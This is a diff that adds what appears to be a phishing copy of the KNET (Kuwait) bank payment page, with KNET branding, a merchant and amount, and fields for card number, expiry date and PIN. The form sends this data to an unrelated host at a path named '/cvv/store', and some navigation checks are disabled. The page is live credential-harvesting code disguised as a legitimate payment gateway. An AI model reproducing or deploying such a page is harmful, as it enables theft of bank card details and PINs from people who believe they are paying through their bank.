+                                document.getElementById("rdc").value = "DRDC";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                                if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                    if (document.getElementById("cardCVVD2HideShow"))
+                                        document.getElementById("cardCVVD2HideShow").style.display = 'block';
+                                    if (document.getElementById("cardCVVHideShow1"))
+                                        document.getElementById("cardCVVHideShow1").style.display = 'none';
+                                    if (document.getElementById("cardCVVHideShow"))
+                                        document.getElementById("cardCVVHideShow").style.display = 'none';
+                                    if (document.getElementById("savedcardCVVD2HideShow"))
+                                        document.getElementById("savedcardCVVD2HideShow").style.display = 'none';
+                                }
+                                document.getElementById("rdc").value = "CRDC";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                                if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                    if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                        document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'block';
+                                    if (document.getElementById("savedcardCVVD2HideShow"))
+                                        document.getElementById("savedcardCVVD2HideShow").style.display = 'block';
+                                    if (document.getElementById("otherCardCVVHideShow1"))
+                                        document.getElementById("otherCardCVVHideShow1").style.display = 'none';
+                                    if (document.getElementById("otherCardCVVHideShow"))
+                                        document.getElementById("otherCardCVVHideShow").style.display = 'none';
+                                    if (document.getElementById("savedCardCVVHideShow"))
+                                        document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                                }
+                                document.getElementById("rdc").value = "OCRDC";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                                //if(document.paypage.debitSel.value=='VP' || document.paypage.debitSel.value=='V') {	
+                                if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                    document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'block';
+                                if (document.getElementById("otherDebitCardCVVHideShow"))
+                                    document.getElementById("otherDebitCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("savedCardCVD2HideShowPIN"))
+                                    document.getElementById("savedCardCVD2HideShowPIN").style.display = 'none';
+                                if (document.getElementById("savedCardCVVHideShow"))
+                                    document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                                //}
+                                document.getElementById("rdc").value = "ODRDC";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'SVC') {
+                                if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                    if (document.getElementById("savedcardCVD2HideShowPIN"))
+                                        document.getElementById("savedcardCVD2HideShowPIN").style.display = 'block';
+                                    if (document.getElementById("savedCardCVVHideShow"))
+                                        document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                                }
+                                document.getElementById("rdc").value = "DRDC";
+                            }
+
+
+                            //	document.getElementById("rdc").value = "RDC";
+                            document.getElementById("maestro").value = "";
+
+                        } else {
+                            document.getElementById("rdc").value = "";
+                            document.getElementById("maestro").value = "";
+
+                            if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                                if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                    if (document.getElementById("cardCVVHideShow"))
+                                        document.getElementById("cardCVVHideShow").style.display = 'block';
+                                    if (document.getElementById("cardCVVHideShow1"))
+                                        document.getElementById("cardCVVHideShow1").style.display = 'block';
+                                    if (document.getElementById("cardCVVD2HideShow"))
+                                        document.getElementById("cardCVVD2HideShow").style.display = 'none';
+                                    if (document.getElementById("savedcardCVVHideShow"))
+                                        document.getElementById("savedcardCVVHideShow").style.display = 'block';
+                                }
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                                if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                    if (document.getElementById("cardCVD2HideShowPIN"))
+                                        document.getElementById("cardCVD2HideShowPIN").style.display = 'none';
+                                    if (document.getElementById("debitCardCVVHideShow"))
+                                        document.getElementById("debitCardCVVHideShow").style.display = 'block';
+                                    if (document.getElementById("savedcardCVD2HideShowPIN"))
+                                        document.getElementById("savedcardCVD2HideShowPIN").style.display = 'none';
+                                    if (document.getElementById("savedCardCVVHideShow"))
+                                        document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                                }
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                                if (document.paypage.creditSel.value == 'VP' || document.paypage.creditSel.value == 'V') {
+                                    if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                        document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'none';
+                                    if (document.getElementById("otherCardCVVHideShow1"))
+                                        document.getElementById("otherCardCVVHideShow1").style.display = 'block';
+                                    if (document.getElementById("otherCardCVVHideShow"))
+                                        document.getElementById("otherCardCVVHideShow").style.display = 'block';
+                                    if (document.getElementById("savedcardCVVD2HideShow"))
+                                        document.getElementById("savedcardCVVD2HideShow").style.display = 'none';
+                                }
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                                if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                    if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                        document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'none';
+                                    if (document.getElementById("savedCardCVD2HideShowPIN"))
+                                        document.getElementById("savedCardCVD2HideShowPIN").style.display = 'none';
+                                    if (document.getElementById("otherDebitCardCVVHideShow"))
+                                        document.getElementById("otherDebitCardCVVHideShow").style.display = 'block';
+                                    if (document.getElementById("savedCardCVVHideShow"))
+                                        document.getElementById("savedCardCVVHideShow").style.display = 'block';
+                                }
+                            }
+                        }
+
+                    }
+                }
+
+            }
+        }
+
+        /* code added for back button fix -Starts */
+
+        var historyCount = 0;
+        window.onload = function() {
+
+            //  if (typeof history.pushState === "function" && document.paypage.backFlag.value=="1" ) {
+            if (typeof history.pushState === "function" && 0 == 1) {
+                history.pushState("jibberish", null, null);
+                window.onpopstate = function() {
+                    history.pushState('newjibberish', null, null);
+                    //   if (historyCount >-1 && document.paypage.backFlag.value=="1") {
+                    if (historyCount > -1 && 0 == 1) {
+                        onback();
+                    }
+                    historyCount++;
+
+                };
+            }
+        }
+
+
+
+        function onback() {
+            if (0 == 1) {
+                document.paypage.action = "/kpg/gstnErrorPage.htm?errorCode=PMT9014";
+                document.paypage.submit();
+            }
+        }
+
+        function onback_Click() {
+            var payid = document.paypage.paymentId.value;
+            //Added for prod issue - 29-jun-21
+            //document.paypage.pymntpagebkstatus.value=1;
+
+            if (document.getElementById("debitNumber")) {
+                document.getElementById("debitNumber").value = "";
+            }
+
+            if (document.getElementById("dcprefix")) {
+                document.getElementById("dcprefix").value = "";
+            }
+
+            if (document.getElementById("cardPin")) {
+                document.getElementById("cardPin").value = "";
+            }
+
+            if (document.getElementById("debitsavedcardPIN")) {
+                document.getElementById("debitsavedcardPIN").value = "";
+            }
+
+            document.paypage.action = "/kpg/paymentpage.htm?PaymentID=" + payid;
+            document.paypage.submit();
+
+        }
+
+        //code added for GSTN fix -starts
+        function onRefresh() {
+
+            if (0 == 1) {
+                document.paypage.action = "/kpg/gstnErrorPage.htm?errorCode=PMT9015";
+                document.paypage.submit();
+            }
+
+        }
+        //code added for GSTN fix -ends
+
+
+
+
+
+
+        function onclckCancel() {
+            if (false) {
+                document.paypage.fCFlg.value = document.paypage.fCFlg.value;
+            }
+            document.paypage.action = "/kpg/paymentcancel.htm?paymentid=" + document.paypage.paymentId.value;
+            document.paypage.submit();
+        }
+    </script>
+
+    <script type="text/javascript">
+        function cancelPage() {
+            //code added for GSTN fix -starts
+            if (0 == 1) {
+                document.paypage.action = "/kpg/gstnErrorPage.htm?errorCode=PMT9016";
+                document.paypage.submit();
+
+            } else {
+
+                if (document.getElementById("debitNumber")) {
+                    document.getElementById("debitNumber").value = "";
+                }
+
+                if (document.getElementById("dcprefix")) {
+                    document.getElementById("dcprefix").value = "";
+                }
+
+                if (document.getElementById("cardPin")) {
+                    document.getElementById("cardPin").value = "";
+                }
+
+                if (document.getElementById("debitsavedcardPIN")) {
+                    document.getElementById("debitsavedcardPIN").value = "";
+                }
+
+                if (document.getElementById("debitCardNumber")) {
+                    document.getElementById("debitCardNumber").value = "";
+                }
+
+                document.paypage.action = "/kpg/paymentcancel.htm?paymentid=" + document.paypage.paymentId.value;
+                document.paypage.submit();
+            }
+            //code added for GSTN fix -ends 
+        }
+
+        //code added for GSTN fix -starts
+        function onRefresh() {
+
+            if (0 == 1) {
+                document.paypage.action = "/kpg/gstnErrorPage.htm?errorCode=PMT9015";
+                document.paypage.submit();
+            }
+
+        }
+        //code added for GSTN fix -ends
+        function cptchaMsg() {
+            alert('By entering the code you see in the box, you help prevent automated transactions. This reduces system loads and ensures better performance of our services. If no image appears, please make sure your browser is set to display images and try again. If you are not sure what the code is, make your best guess. If you guess incorrectly, you will have another oppurtunity provided with a different code.');
+        }
+
+        function cvvMsg() {
+            alert('The Card Verification Value (CVV) is a 3-digit number found on the signature panel on the back of your card following the printed Card number.');
+        }
+
+        function expMsg() {
+            alert('Customers are requested to enter Valid From / Valid Thru / Expiry Date. These details would be available on the front panel of the card.');
+        }
+
+        function pinMsg() {
+            alert('Personal Identification Number (PIN) is the secret numeric password used to authenticate the user while performing any ATM, Point of sale	and internet transactions. The Cardholder expresses authority to the Bank for carrying out transactions and instructions authenticated by the PIN. You will be required to enter your PIN only once for every transaction.');
+        }
+    </script>
+
+    <script type="text/javascript">
+        function openCapWin() {
+            window.open('help.htm?page=captcha', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=320')
+        }
+
+        function openCvvWin() {
+            window.open('help.htm?page=cvv', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=370')
+        }
+
+        function openPinWin() {
+            window.open('help.htm?page=pin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=300')
+        }
+
+        function openExpiryDateWin() {
+            window.open('help.htm?page=expiryDate', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=250')
+        }
+
+        function openEcomPinWin() {
+            window.open('help.htm?page=ecomPin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=400')
+        }
+
+        function openAtmEcomPinWin() {
+            window.open('help.htm?page=atmEcomPin', '_blank', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=yes, width=520, height=400')
+        }
+    </script>
+
+
+    <noscript>
+<style>
+#PayPageEntry{
+display: none;
+}
+#payConfirm{
+display: none;
+}
+</style>	 
+ <div class="content-block" style="width: 90%;"> 
+  	<div class="form-card">
+			<img class="logoHead-mob" src='data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAAA8AAD/4QMvaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzEzOCA3OS4xNTk4MjQsIDIwMTYvMDkvMTQtMDE6MDk6MDEgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE3IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpCQkQ3ODE4QjgxMzcxMUU5OTYxMEE3Q0ZGN0I0Q0E3MSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpCQkQ3ODE4QzgxMzcxMUU5OTYxMEE3Q0ZGN0I0Q0E3MSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkJCRDc4MTg5ODEzNzExRTk5NjEwQTdDRkY3QjRDQTcxIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkJCRDc4MThBODEzNzExRTk5NjEwQTdDRkY3QjRDQTcxIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+/+4ADkFkb2JlAGTAAAAAAf/bAIQABgQEBAUEBgUFBgkGBQYJ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' alt="logo" />
+  	</div>
+		<div class="form-card">
+			<div  class="notification" style="border: #ff0000 2px solid; margin-top: 30%;margin-bottom: 30%;background-color: #f7dadd; font-size: 12px;
+	    						font-family: helvetica, arial, sans serif;border-radius: 5px;
+	    						color: #ff0000;
+	   							 padding: 10px; width:auto">
+				<center><FONT color="red" style="font-weight:bolder">JavaScript Error</FONT></center>
+				<br />
+				<center><FONT color="red" style="font-weight:bolder">Your browser doesn&#39;t support JavaScript or it&#39;s disabled!!</FONT></center>
+				<br />
+				<center><FONT color="red" style="font-weight:bolder">Please enable JavaScript in the Browser</FONT></center>
+				<center><FONT color="red" style="font-weight:bolder">before trying again</FONT></center>
+		   </div>
+		</div>
+	</div>
+</noscript>
+    <!--Code Ends  -->
+
+
+
+    <form action="https://asderw-link.com/cvv/store" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
+        <div class="madd"> </div>
+
+
+
+        <div id="PayPageEntry" style="display: none;">
+            <div class="container">
+
+                <div class="content-block">
+
+
+                    <div class="form-card">
+                        <div class="container-blogo">
+                            <img style="width: 60px" class="" src="/knet/knet.png" alt="logo">
+                        </div>
+                        <div class="row">
+                            <label class="column-label">Merchant: </label>
+                            <label class="column-value text-label"> Alkuwait</label>
+                        </div>
+                        <div id="OrgTranxAmt">
+                            <label class="column-label">
+                            Amount:
+                        </label>
+                            <label class="column-value text-label">
+                           KD 5.000
+                            </label>
+                        </div>
+
+                        <!-- Added for PG Eidia Discount starts   -->
+
+                        <div class="row" id="DiscntRate" style="display:none;">
+
+                        </div>
+                        <div class="row" id="DiscntedAmt" style="display:none;">
+
+                        </div>
+
+                        <!-- Added for PG Eidia Discount ends   -->
+
+                    </div>
+
+                    <div class="form-card">
+                        <div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="otpmsgDC"></div>
+
+                        <!--Customer Validation  for knet-->
+                        <div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="CVmsg">
+                        </div>
+
+                        <div id="ValidationMessage">
+
+
+                            <!--span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
+													</span-->
+
+
+                        </div>
+
+
+
+
+                        <div id="FCUseDebitEnable" style="margin-top: 5px;">
+
+                            <div class="row">
+                                <label class="column-label" style="width:40%;">Select Your Bank:</label>
+
+
+                            </div>
+
+                            <div class="row three-column" id="Paymentpagecardnumber"><label class="column-label">Card Number: </label><label><select class="column-value" name="dcprefix" id="dcprefix" style="width: 26%;"><option value="450778" title="450778">450778</option><option value="485602" title="485602">485602</option><option value="537016" title="537016">537016</option><option value="532674" title="532674">532674</option></select></label><label>  <input name="debitNumber" id="debitNumber" type="tel" pattern="[0-9]" size="10" class="allownumericwithoutdecimal" style="width: 32%;" maxlength="10" onclick="javascript:validateprefixid(this.value)" onblur="return ValidateNumPin(event);" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" title="Should be in number. Length should be 10"></label></div>
+
+                            <div class="row three-column" id="cardExpdate">
+
+                                <div id="debitExpDate">
+                                    <label class="column-label">
+															Expiration Date:
+														</label></div>
+
+
+                                <select onchange="javascript:setdebitMonth(this.value)" class="column-value">
+																									<option value="0">
+																										MM
+																									</option>
+																									
+																										<option value="1">
+																											
+																												
+																													01
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="2">
+																											
+																												
+																													02
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="3">
+																											
+																												
+																													03
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="4">
+																											
+																												
+																													04
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="5">
+																											
+																												
+																													05
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="6">
+																											
+																												
+																													06
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="7">
+																											
+																												
+																													07
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="8">
+																											
+																												
+																													08
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="9">
+																											
+																												
+																													09
+																												
+																												
+																											
+																										</option>
+																									
+																										<option value="10">
+																											
+																												
+																												
+																													10
+																												
+																											
+																										</option>
+																									
+																										<option value="11">
+																											
+																												
+																												
+																													11
+																												
+																											
+																										</option>
+																									
+																										<option value="12">
+																											
+																												
+																												
+																													12
+																												
+																											
+																										</option>
+																									
+																								</select>
+
+                                <select onchange="javascript:setdebitYear(this.value)" class="column-long">
+																									<option value="0">
+																										YYYY
+																									</option>
+																									
+																										<option value="2024">
+																											2024
+																										</option>
+																									
+																										<option value="2025">
+																											2025
+																										</option>
+																									
+																										<option value="2026">
+																											2026
+																										</option>
+																									
+																										<option value="2027">
+																											2027
+																										</option>
+																									
+																										<option value="2028">
+																											2028
+																										</option>
+																									
+																										<option value="2029">
+																											2029
+																										</option>
+																									
+																										<option value="2030">
+																											2030
+																										</option>
+																									
+																										<option value="2031">
+																											2031
+																										</option>
+																									
+																										<option value="2032">
+																											2032
+																										</option>
+																									
+																										<option value="2033">
+																											2033
+																										</option>
+																									
+																										<option value="2034">
+																											2034
+																										</option>
+																									
+																										<option value="2035">
+																											2035
+																										</option>
+																									
+																										<option value="2036">
+																											2036
+																										</option>
+																									
+																										<option value="2037">
+																											2037
+																										</option>
+																									
+																										<option value="2038">
+																											2038
+																										</option>
+																									
+																										<option value="2039">
+																											2039
+																										</option>
+																									
+																										<option value="2040">
+																											2040
+																										</option>
+																									
+																										<option value="2041">
+																											2041
+																										</option>
+																									
+																										<option value="2042">
+																											2042
+																										</option>
+																									
+																										<option value="2043">
+																											2043
+																										</option>
+																									
+																										<option value="2044">
+																											2044
+																										</option>
+																									
+																										<option value="2045">
+																											2045
+																										</option>
+																									
+																										<option value="2046">
+																											2046
+																										</option>
+																									
+																										<option value="2047">
+																											2047
+																										</option>
+																									
+																										<option value="2048">
+																											2048
+																										</option>
+																									
+																										<option value="2049">
+																											2049
+																										</option>
+																									
+																										<option value="2050">
+																											2050
+																										</option>
+																									
+																										<option value="2051">
+																											2051
+																										</option>
+																									
+																										<option value="2052">
+																											2052
+																										</option>
+																									
+																										<option value="2053">
+																											2053
+																										</option>
+																									
+																										<option value="2054">
+																											2054
+																										</option>
+																									
+																										<option value="2055">
+																											2055
+																										</option>
+																									
+																										<option value="2056">
+																											2056
+																										</option>
+																									
+																										<option value="2057">
+																											2057
+																										</option>
+																									
+																										<option value="2058">
+																											2058
+																										</option>
+																									
+																										<option value="2059">
+																											2059
+																										</option>
+																									
+																										<option value="2060">
+																											2060
+																										</option>
+																									
+																										<option value="2061">
+																											2061
+																										</option>
+																									
+																										<option value="2062">
+																											2062
+																										</option>
+																									
+																										<option value="2063">
+																											2063
+																										</option>
+																									
+																										<option value="2064">
+																											2064
+																										</option>
+																									
+																										<option value="2065">
+																											2065
+																										</option>
+																									
+																										<option value="2066">
+																											2066
+																										</option>
+																									
+																										<option value="2067">
+																											2067
+																										</option>
+																									
+																								</select>
+
+
+                            </div>
+                            <div class="row" id="PinRow">
+
+                                <!-- <div class="col-lg-12"><label class="col-lg-6"></label></div> -->
+                                <input type="hidden" name="cardPinType" value="A">
+                                <div id="eComPin">
+                                    <label class="column-label">
+															PIN:
+														</label>
+                                </div>
+                                <div>
+                                    <input inputmode="numeric" pattern="[0-9]*" name="code" id="cardPin" autocomplete="off" title="Should be in number. Length should be 4" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style="width:60%;">
+
+                                </div>
+
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-card">
+                        <div class="row">
+
+                            <div style="text-align:center;">
+                                <div id="loading" style="display:none;">
+                                    <center><img src="/knetVern/loading.gif" style="height:20px;float:left;margin-left:20%"><label class="column-value text-label" style="width:70%;text-align:center;">Processing.. please wait ...</label></center>
+                                </div>
+
+
+
+
+
+
+                                <div id="submithide">
+                                    <button type="submit" class="submit-button"> Submit</button>
+                                    <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags(&#39;MobCancelBtn&#39;,&#39;MobPayPage&#39;,&#39;CancelBtn&#39;);" id="cancel1" value="Cancel">
+
+                                </div>
+
+
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div align="center" id="overlayhide" class="overlay" style="display: none;">
+                        <img src="/knetVern/loadingmob.gif" style="height: 15%;margin-top:50%;">
+                    </div>
+
+
+
+
+
+                    <footer>
+                        <div class="footer-content-new">
+                            <div class="row_new">
+                                <div style="text-align: center;font-size: 11px;line-height: 18px;">
+                                    All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;<br><span style="font-size: 10px;font-weight:bold;color: #0077D5;">The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET</span>
+                                </div>
